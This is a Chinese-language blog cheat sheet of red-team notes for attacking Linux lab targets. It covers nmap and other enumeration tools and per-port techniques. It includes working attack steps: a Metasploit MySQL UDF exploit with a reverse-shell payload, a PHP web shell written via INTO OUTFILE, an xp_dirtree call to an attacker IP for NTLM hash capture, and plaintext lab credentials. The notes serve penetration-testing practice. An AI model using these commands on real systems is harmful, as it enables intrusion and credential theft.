---
title: Linux打靶思路
date: 2025-3-26 00:00:00
tags: 红队
categories: 红队打靶-Linux
---

还在持续更新~

# 1.主机发现

## 1.netdiscover

```
-i 监听你的网卡
-p 被动模式。默默的侦听指定的网卡以发现别的二层主机
-t ARP包发送间隔。单位毫秒。这个可以用来规避检测系统的告警。
-l file: 指定扫描范围列表文件
-p passive mode: 使用被动扫描的方式，不发送任何数据
-m file: 扫描已知 mac 地址和主机名的电脑列表
-F filter: 指定 pcap 筛选器表达式(默认:“arp”)
-s time: 每个 arp 请求之间的睡眠时间(毫秒)
-n node: 使用八字节的形式扫描(2 - 253)
-c count: 发送 arp 请求的时间次数
-f: 使用主动模式的扫描
-d: 忽略配置文件
-S: 启用每个 arp 请求之间抑制的睡眠时间
-P: 打印结果
-N: 不打印头。只有启用- p时有效。
-L: 将捕获的信息输出(-P)，并继续进行扫描

```

```
监听网卡，发现主机：netdiscover -i eth0 -r 192.168.137.0/24
```



## 2.nmap

```
1. nmap -sT 192.168.96.4  //TCP连接扫描，不安全，慢--
2. nmap -sS 192.168.96.4  //SYN扫描,使用最频繁，安全，快
3. nmap -Pn 192.168.96.4  //目标机禁用ping，绕过ping扫描
4. nmap -sU 192.168.96.4  //UDP扫描,慢,可得到有价值的服务器程序
5. nmap -sI 僵尸ip 目标ip  //使用僵尸机对目标机发送数据包
6. nmap -sA 192.168.96.4  //检测哪些端口被屏蔽
7. nmap 192.168.96.4 -p <portnumber>  //对指定端口扫描
8. nmap 192.168.96.1/24 //对整个网段的主机进行扫描
9. nmap 192.168.96.4 -oX myscan.xml //对扫描结果另存在myscan.xml
10. nmap -T1~6 192.168.96.4  //设置扫描速度，一般T4足够。
11. nmap -sV 192.168.96.4  //对端口上的服务程序版本进行扫描
12. nmap -O 192.168.96.4  //对目标主机的操作系统进行扫描
13. nmap -sC <scirptfile> 192.168.96.4  //使用脚本进行扫描，耗时长
14. nmap -A 192.168.96.4  //强力扫描，耗时长
15. nmap -6 ipv6地址   //对ipv6地址的主机进行扫描
16. nmap -f 192.168.96.4  //使用小数据包发送，避免被识别出
17. nmap –mtu <size> 192.168.96.4 //发送的包大小,最大传输单元必须是8的整数
18. nmap -D <假ip> 192.168.96.4 //发送参杂着假ip的数据包检测
19. nmap --source-port <portnumber> //针对防火墙只允许的源端口
20. nmap –data-length: <length> 192.168.96.4 //改变发生数据包的默认的长度，避免被识别出来是nmap发送的。
21. nmap -v 192.168.96.4  //显示冗余信息(扫描细节)
22. nmap -sn 192.168.96.4  //对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）
23. nmap -sP 192.168.96.4  //仅仅对目标进行ping检测。
24. nmap -n/-R 192.168.96.4  //-n表示不进行dns解析，-R表示对ip进行dns反向解析
25. nmap --system-dns 192.168.96.4  //扫描指定系统的dns服务器
26. nmap –traceroute 192.168.96.4  //追踪每个路由节点。
27. nmap -PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。
28. nmap -sP 192.168.96.4       //主机存活性扫描，arp直连方式。
29. nmap -iR [number]       //对随机生成number个地址进行扫描。
30. nmap -script=vuln 漏洞扫描
```



```
nmap -sT -sV -O -p22,80,111,443,631,3306 192.168.137.132
```

```
nmap -nvv -Pn -sV -p [port] --version-intensity 9 -A [ip]

-nvv：扫描路由器 
-Pn：不进行ping扫描
-sSV：将会在扫描结果的最后添加上对系统版本的识别结果ls
-p：扫描的端口
--version-intensity：设置版本扫描强度
-A：操作系统扫描,脚本扫描,路由跟踪,服务探测

```

分离端口

```
ports=$(grep open kioptix2.nmap | awk -F'/' '{print $1}' | paste -sd',')
```



## 3.whatweb(指纹识别)

```
whatweb IP地址或域名
-v 获取更详细的信息
```



## 4.目录扫描

### dirb

### dirsearch

### gobuster

## 5.DNS解析

`A记录`： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录

`CNAME记录`： 如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名

`MX记录`： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录

`NS记录`： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录

`TXT记录`： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录

`AAAA记录`： 将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录

`SRV记录`： 添加服务记录服务器服务记录时会添加此项，SRV记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）。

`SOA记录`： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器

`PTR记录`： PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名

`显性URL转发记录`： 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址为：www.itbilu.com。

`隐性URL转发记录`： 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址，隐性转发会隐藏真实的目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址仍然是：www.liuht.cn。

```
nsloopup
>set type=mx
>www.liam317.top
```

```
-t参数指定查询的类型
host -t ns liam317.top
```

## 6.theharvester

```
-h        显示此帮助消息并退出

-d        要搜索的公司名称或域名

-l         限制搜索结果的数量，默认=500

-S        从结果编号 X 开始，默认=0

-p        使用代理进行请求，在 proxies.yaml 中输入代理

-s        使用Shodan查询发现的主机

-v        通过 DNS 解析验证主机名并搜索虚拟主机

-e        用于查找的 DNS 服务器

-t         检查收购情况

-r        使用解析器列表或传入解析器对子域执行 DNS 解析，默认为假

-n        启用 DNS 服务器查找，默认 False

-c        对域执行 DNS 暴力破解

-f        将结果保存到 XML 和 JSON 文件

-b        指定搜索引擎和数据源
```

## 7.maltego

## 8.whatweb

查看http服务的中间件跟开发语言版本

```
whatweb -v 192.168.0.185
```

## vhost

想知道一个目的IP有哪些对应的服务域名/虚拟主机时，**vhost**则非常有用

可以使用gobuster的vhost模式

```
gobuster vhost -u "http://10.10.11.177" -w /usr/share/wordlists/amass/subdomains.lst -k -t 100
```



# 2.漏洞发现

## 1.nikto

对网站服务器进行全面的多种扫描

```
//一般信息
nikto -host 目标ip
//敏感目录
nikto -host http://目标IP/dvwa
//特定端口扫描
nikto -host 目标ip -p 端口号

来个nmap和nikto联动
// 把开放的80端口的网络地址放在“-”中，然后作为nikto命令输入，通过管道符·“|”连接
//-oG表示输出
nmap -p 80 192.168.1.0/24 -oG - |nikto -host -

```



## 2.Nessus

## 3.searchsploit

上面工具进行漏洞发现，该工具进行查找

### 基本搜索

```
#searchsploit smb windows remote 
```

默认是使用AND连接，搜索的关键词越多越精确，

### 标题搜索

```
#searchsploit -t smb windows remote 
```

只会对标题中关键词进行搜索，不会对路径中的关键词进行匹配

### 排除项

```
#searchsploit smb windows remote --exclude="(POC)|TXT"
```

### 管道输出

```
#searchsploit smb windows remote | grep rb
```

### 复制到剪切板

```
#searchsploit -p smb windows remote
```

`-p`参数可以获取更多关于该漏洞的信息,以及将完整的路径复制到剪贴板上(如果可能的话)

### 复制到文件夹

不建议在本地的漏洞数据库中修改exp,建议使用`-m`参数复制那些有用的到当前的工作目录

```
#searchsploit -m unix/remote/21671.c
```

# 端口

[25,465,587 - 渗透测试 SMTP/s - HackTricks --- 25,465,587 - Pentesting SMTP/s - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html)

## 21端口 ftp

### 匿名登录

FTP的匿名登录一般有三种：
1、 用户名：Anonymous/anonymous 密码：Email或者为空

2、 用户名：FTP 密码：FTP或者为空

3、 用户名：USER 密码：pass

```
ftp Anonymous@192.168.137.147
```

### 下载文件

get [remote-file] [local-file]

批量下载 mget * 下载当前文件夹下的所有内容

## 25端口 smtp

### 列举命令

```
nmap -p25 --script smtp-commands 10.10.10.10
```

### 用户枚举

用于测试用户是否存在

```
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test    //枚举用户，若存在则返回250，并且ok
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```

```
直接枚举用户
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.137.146 25
```

#### 自动化工具

```
Metasploit: auxiliary/scanner/smtp/smtp_enum
```

## 69端口 tftp

TFTP 不提供目录列表，因此 `nmap` 的脚本 `tftp-enum` 将尝试暴力破解默认路径。

```
nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP>
```

### 下载/上传

您可以使用 Metasploit 或 Python 来检查是否可以下载/上传文件：

```
msf5> auxiliary/admin/tftp/tftp_transfer_util
```

```
import tftpy
client = tftpy.TftpClient(<ip>, <port>)
client.download("filename in server", "/tmp/filename", timeout=5)
client.upload("filename to upload", "/local/path/file", timeout=5)
```



## 75端口 finger

### 用户枚举

```
finger root@ip  #get info for root
```

#### msfconsole

```
use auxiliary/scanner/finger/finger_users
```

## 80端口 http

### URL模糊测试-ffuf

• 目录发现，可选择在 URL 中的任何位置进行模糊测试。
• 子域名发现
• 使用各种 HTTP 方法进行模糊测试。

```
• -u url地址
• -w 设置字典
• -c 将响应状态码用颜色区分，windows下无法实现该效果。
• -t 线程率，默认40
• -p 请求延时： 0.1、0.2s
• -ac 自动校准fuzz结果
• -H Header头，格式为 “Name: Value”
• -X HTTP method to use
• -d POST data
• -r 跟随重定向
• -recursion num 递归扫描
• -x 设置代理 http 或 socks5://127.0.0.1:8080
• -s 不打印附加信息，简洁输出
• -e 设置脚本语言 -e .asp,.php,.html,.txt等
• -o 输出文本
• -of 输出格式文件，支持html、json、md、csv、或者all


ffuf -u "http://192.168.242.62/FUZZ"  -w /usr/share   -fc "200"   -o 2.html -of html

匹配输出(MATCHER)
ffuf提供了仅获取具有特定特征的状态码、行数、响应大小、字数以及匹配正则表达式的模式进行响应输出。

-mc ：指定状态代码。

-ml：指定响应行数

-mr: 指定正则表达式模式

-ms：指定响应大小

-mw：指定响应字数
```



## 110端口 pop3

### 敏感数据

```
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts
```

## 111端口 rpcinfo

此外，**Portmapper** 通常与 **NFS（网络文件系统）、NIS****（网络信息服务）**和其他**基于 RPC 的服务**结合使用，以有效地管理网络服务。

### enumeration

```
rpcinfo irked.htb
nmap -sSUC -p111 192.168.10.1
```

如果发现NFS服务，那么可能可以列出和下载文件

## 143端口 imap

### information disclosure

如果服务器支持 NTLM 身份验证 （Windows），则可以获取敏感信息 （版本） ：

```
root@kali: telnet example.com 143
* OK The Microsoft Exchange IMAP4 service is ready.
>> a1 AUTHENTICATE NTLM
+
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
+ TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```

## 139或445端口 samba

### 1.smbclient

它提供一种命令行使用交互式方式访问samba服务器的共享资源。

```txt
-B<ip地址>：传送广播数据包时所用的IP地址；
-d<排错层级>：指定记录文件所记载事件的详细程度；
-E：将信息送到标准错误输出设备；
-h：显示帮助；
-i<范围>：设置NetBIOS名称范围；
-I<IP地址>：指定服务器的IP地址；
-l<记录文件>：指定记录文件的名称；
-L：显示服务器端所分享出来的所有资源；
-M<NetBIOS名称>：可利用WinPopup协议，将信息送给选项中所指定的主机；
-n<NetBIOS名称>：指定用户端所要使用的NetBIOS名称；
-N：不用询问密码；
-O<连接槽选项>：设置用户端TCP连接槽的选项；
-p<TCP连接端口>：指定服务器端TCP连接端口编号；
-R<名称解析顺序>：设置NetBIOS名称解析的顺序；
-s<目录>：指定smb.conf所在的目录；
-t<服务器字码>：设置用何种字符码来解析服务器端的文件名称；
-T<tar选项>：备份服务器端分享的全部文件，并打包成tar格式的文件；
-U<用户名称>：指定用户名称；
-w<工作群组>：指定工作群组名称。
```

```
smbclient -L 10.10.11.202 列出服务器上的共享资源
smbclient //10.10.11.202/directory -U user 连接到服务器上的共享资源,有些情况也可以不指定用户
smbclient -L 10.10.10.193 -U svc-print --password=$fab@s3Rv1ce$1
smbclient //10.10.11.202/directory
```

### 2.smbmap

```
smbmap -H 10.10.10.193 -u svc-scan -p '$fab@s3Rv1ce$1'
```



### 2.enum4linux

```
        -a 	做所有简单枚举（-U -S -G -P -r -o -n -i），如果您没有提供任何其他选项，则启用此选项
        -h 	                     显示此帮助消息并退出
        -r 	                       通过RID循环枚举用户
        -R 	RID范围要枚举（默认值：500-550,1000-1050，隐含-r）
        -K 	指定不对应次数n。继续搜索RID，直到n个连续的RID与用户名不对应，Impies RID范围结束于999999.对DC有用
        -l 	通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DN）
        -s 	文件暴力猜测共享名称
        -k 	user 远程系统上存在的用户（默认值：administrator，guest，krbtgt，domain admins，root，bin，none）
用于获取sid与“lookupsid known_username”
使用逗号尝试几个用户：“-k admin，user1，user2”
        -o 	获取操作系统信息
        -i 	获取打印机信息
        -w 	手动指定工作组（通常自动找到）
        -n	做一个nmblookup（类似于nbtstat）
        -v	详细输出，显示正在运行的完整命令（net，rpcclient等）
```

#### 3.msf

smb_version

### 连接到smb shell

```
smbclient //10.129.1.14/目录
```

## 161端口 SNMP

**SNMP - 简单网络管理协议**是一种用于监控网络中不同设备（如路由器、交换机、打印机、物联网……）的协议。

```
信息枚举

snmpwalk + -c SNMP读密码 + -v 1或2(SNMP版本) + 交换机或路由器IP地址 + OID(对象标示符)
（-v指版本，-c 指密钥，即客户端snmp.conf里所设置）

public + ip/host 

1、snmpwalk -v 2c -c public 9.0.0.1 .1.3.6.1.2.1.4.20 取得IP信息

2、snmpwalk -v 2c -c public 9.0.0.1 system 查看系统信息

3、snmpwalk -v 2c -c public 9.0.0.1 ifDescr 获取网卡信息

4、snmpwalk -v 2c -c public 9.0.0.1 所有系统信息都获取

5、snmpwalk -v 2c -c public 9.0.0.1 1.3.6.1.4.1.9.9.109.1.1.1.1.7.1 获取CPU使用率


在日常监控中,经常会用到snmp服务,而snmpwalk命令则是测试系统各种信息最有效的方法,命令格式：
snmpwalk -c SNMP读密码 -v 1或2(代表SNMP版本) 交换机或路由器IP地址 OID(对象标示符)
```



## 389端口 LDAP（轻量级目录访问协议）

使用主要用于定位各种实体，例如组织、个人以及网络中的文件和设备等资源，包括公共和私有。与其前身 DAP 相比，它通过占用更少的代码提供了一种简化的方法。

**默认端口：**389 和 636 （ldaps）。默认情况下，全局目录（ActiveDirectory 中的 LDAP）在 LDAPS 的端口 **3268** 和 **3269** 上可用。

```
一些属性类型的介绍
c - country name，国家名
cn - common name，通用名称
dc - domain component，域名组件
o - organization name，机构名
ou - organization unit name，机构的单位名
sn - surname，姓
st - state or province name，州或省
```

```
ldapsearch -H ldaps://company.com:636/ -x -s base  namingcontexts
```

```
-x

使用 简单认证（Simple Authentication），即不使用 SASL 认证。
-s base

指定 搜索范围（scope）：
base（基准搜索）：只查询 根目录对象，不会搜索子目录。
其他可选值：
one（单层搜索）：仅查询直接子对象，不递归。
sub（子树搜索）：递归查询整个目录树

namingcontexts

查询 LDAP 服务器的 namingContexts 属性，该属性存储了服务器管理的 目录树的根 DN（Base DN）。
```



## 513端口 Pentesting Rlogin 

可以尝试登录到不需要密码既可以访问的远程主机

```
rlogin <IP> -l <username>
```



## 1433 MSSQL 

### 自动枚举

nmap

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>

```

msf

```
msf> use auxiliary/scanner/mssql/mssql_ping
```

连接

```
impacket-mssqlclient user:password@ip
```

### LLMNR / NBT-NS中毒攻击？

**什么是LLMNR / NBT-NS中毒攻击？**

> 通过侦听LLMNR和NetBIOS广播，攻击者可以伪装成受害者（客户端）要访问的目标机器，从而让受害者乖乖交出相应的登陆凭证。在接受连接后，攻击者可以使用Responder.py或Metasploit等工具将请求转发到执行身份验证过程的流氓服务（如SMB
> TCP：137）。
> 在身份验证过程中，受害者会向流氓服务器发送用于身份认证的NTLMv2哈希值，这个哈希值将被保存到磁盘中，之后就可以使用像Hashcat或John
> Ripper（TJR）这样的工具在线下破解，或直接用于 pass-the-hash攻击。

**Responder**

> Responder是监听LLMNR和NetBIOS协议的工具之一,能够抓取网络中的所有LLMNR和NetBIOS请求并进行响应,获取最初的账户凭证,可以利用内置SMB,MSSQL,
> HTTP,DNS, POP3,FTP 等服务器,收集目标文件的凭证

```
responder -I tun0 -i local.ip
```

在sqlserver中或者smb中执行，让sql去请求我们创造的虚假的服务，sql服务会对我们的服务进行省份验证，可以拦截到身份验证的hash

```
EXEC MASTER.sys.xp_dirtree '\\10.10.16.8\test', 1, 1
```



## 2049端口 NFC

查看挂载

**语法格式**：showmount 参数 域名或IP地址

常用参数：

> -a显示客户端主机名和挂载目录
>
> -d 仅显示已被NFS客户端加载的目录 
>
> -v 显示版本信息
>
> -e 显示NFS服务器上所有的共享目录

```
sudo showmount -e x.x.x.x
```

### mount

进行挂载

```
sudo mount -o rw 10.10.10.10:/tmp /home/kali/mount1
```



## 3306端口 mysql

mysql连接

```
跳过ssl连接
mysql -h192.168.137.142 -P3306 -uroot -p --skip-ssl
```

知道账号密码sqlmap登录

```
sqlmap.py -d "mysql://root:root@192.168.99.100:3306/test" --os-shell
```

### msf

```
use exploit/multi/mysql/mysql_udf_payload
set RHOST 192.168.99.100
set PASSWORD root
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.99.1
exploit 

```


运行后虽然上传了udf文件，创建了sys_exec()函数，但是没有返回session。此时可以通过mysql连接手动创建sys_eval()函数。

```
#先查询上传udf文件名
mysql> select * from mysql.func where name = 'sys_exec';
+----------+-----+--------------+----------+
| name     | ret | dl           | type     |
+----------+-----+--------------+----------+
| sys_exec |   2 | QApbQCTY.dll | function |
#创建sys_eval函数
mysql> create function sys_eval returns string soname 'QApbQCTY.dll';
Query OK, 0 rows affected (0.00 sec)
#测试运行whoami
mysql> select sys_eval('whoami');
+-----------------------+
| sys_eval('whoami')    |
+-----------------------+
| win-88jdvt747gh\test|
+-----------------------+
1 row in set (0.14 sec)
————————————————
```

### 有写入权限

```
show global veriables like '%secure%';

secure_file_priv为空
```

直接写入一句话木马

```
select "<?php system($_GET['132']); phpinfo();?>" into outfile '/var/www/https/blogblog/wp-content/uploads/shell.php';
```



## 3389端口 **远程桌面协议** RDP

连接windows远程桌面

```
/v: // 指定需要远程连接的系统ip或域名 
/u: // 远程系统上的用户名 
/p: // 你可以直接在这条命令输用户密码，若此时不指定可以运行时输入 
/f: // 全屏 
/w: // 指定远程桌面屏幕宽度 
/h: // 指定远程桌面屏幕高度 
/monitors: // 指定远程桌面在哪个显示器打开

xfreerdp /v:192.168.8.8:33389 /u:root /p:lhr  /sound
```

## 5985端口 WinRM 

它支持通过 HTTP（S） **远程管理 Windows 系统**，并在此过程中利用 SOAP。它从根本上由 WMI 提供支持，将自己表现为基于 HTTP 的 WMI作接口。

**Evil-winrm**

Evil-winrm此程序可在启用此功能的任何Microsoft
Windows服务器上使用（通常端口为5985），当然只有在你具有使用凭据和权限时才能使用。包括使用纯文本密码远程登录、SSL 加密登录、
NTLM 哈希登录、密钥登录、文件传输、日志存储等功能。



```
evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie

上传文件：在已连接的情况下进行上传
upload /root/test.txt
```



## 6379端口 redis 

连接redis数据库

```
redis-cli -h ip --user user --pass pass 
```

获取服务器信息

```
info
```

## 20717端口 mongodb

```
目录：/home/kali/tools/mongosh-2.3.2-linux-x64/bin
./mongosh mongodb://10.129.228.30:27017
```



# 博客

## wpscan

WPScan是 **Kali Linux默认自带** 的一款 **漏洞扫描工具** ，它采用 **Ruby**
编写，能够扫描WordPress网站中的多种安全漏洞，其中包括 **主题漏洞、插件漏洞和WordPress本身的漏洞**

```
wpscan --url https://192.168.137.142:12380/blogblog --disable-tls-checks 
```

# 协议密码爆破

## hydra

```
使用语法：hydra 参数 IP地址 服务名
帮助命令：hydra -h
常用命令：hydra [-l 用户名|–L 用户名文件路径] [-p 密码|–P 密码文件路径] [-t 线程数] [–vV 显示详细信息] [–o 输出文件路径] [–f 找到密码就停止] [–e ns 空密码和指定密码试探] [ip|-M ip列表文件路径] [协议]

```

## crackmapexec



# 请求方法

curl -X 指定请求方法 -vv显示请求和返回数据包

```
curl -X OPTIONS url -vv
```

# 文件泄露

## .git

### 提取git泄露

#### git_Extract

```
python2 git_extract.py http://10.10.11.177/dev/.git/
```

#### git-dumper

```
git_dumper http://website.com/.git ~/website
git-dumper http://10.10.11.177/dev/.git dev
```

# 用户枚举

## Cewl

爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：

```
cewl http://www.ignitetechnologies.in/ -w dict.txt
```

如果你想生成指定长度的密码字典，你可以使用-m选项来设置：

```
cewl http://www.ignitetechnologies.in/ -m 9
```

你可以使用-e选项来启用Email参数，并配合-n选项来隐藏工具在爬取网站过程中生成的密码字典：

```
cewl http://www.ignitetechnologies.in/ -n -e
```

如果你想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能：

```
cewl http://www.ignitetechnologies.in/ -c
```

如果你想增加爬虫的爬取深度以生成更大的字典文件，你可以使用-d选项来指定爬取深度，默认的爬取深度为2：

```
cewl http://www.ignitetechnologies.in/ -d 3
```

# 升级bash会话

升级之后可以支持上下条命令滚动以及ctrl+c等

https://www.youtube.com/watch?v=DqE6DxqJg8Q

![image-20250325192322354](./linux%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF/image-20250325192322354.png)

